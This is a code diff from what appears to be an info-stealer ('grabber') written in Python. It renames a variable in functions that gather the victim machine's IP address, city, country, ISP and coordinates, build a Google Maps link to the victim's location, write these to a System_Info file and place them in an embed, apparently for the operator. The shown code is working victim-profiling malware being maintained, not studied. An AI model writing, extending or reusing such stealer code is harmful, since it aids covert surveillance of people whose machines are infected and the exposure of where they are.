@@ -289,7 +289,7 @@ class Functions(object):
 
     @staticmethod
     def info_netword() -> list:
-        ip, city, country, region, org, loc, gglemp = (
+        ip, city, country, region, org, loc, googlemap = (
             "None",
             "None",
             "None",
@@ -307,8 +307,8 @@ class Functions(object):
             region = data.get("region")
             org = data.get("org")
             loc = data.get("loc")
-            gglemp = "https://www.google.com/maps/search/google+map++" + loc
-        return [ip, city, country, region, org, loc, gglemp]
+            googlemap = "https://www.google.com/maps/search/google+map++" + loc
+        return [ip, city, country, region, org, loc, googlemap]
 
 
 class Replacer_Loop(Functions):
@@ -457,7 +457,7 @@ class hwkish_first_funct(Functions):
             self.region,
             self.country,
             self.ip,
-            self.gglemp,
+            self.googlemap,
             self.org,
             self.loc,
         ) = (net[0], net[1], net[2], net[3], net[4], net[5], net[6])
@@ -1893,7 +1893,7 @@ class hwkish_first_funct(Functions):
             f"Country: {self.country}",
             f"Region: {self.region}",
             f"Org: {self.org}",
-            f"GoogleMaps: {self.gglemp}",
+            f"GoogleMaps: {self.googlemap}",
             f"Lang: {self.pc_codewinl}"
         ]
         with open(ntpath.join(self.dir, 'Systeme', 'System_Info.txt'), 'w', encoding='utf-8', errors='ignore') as f:
@@ -1949,7 +1949,7 @@ class hwkish_first_funct(Functions):
                         "icon_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/ghost-eye.gif",
                     },
                     "color": 16734976,
-                    "description": f"[{hwkish}-{grbber} ON TOP]({self.gglemp})",
+                    "description": f"[{hwkish}-{grbber} ON TOP]({self.googlemap})",
                     "fields": [
                         {
                             "name": "\u200b",
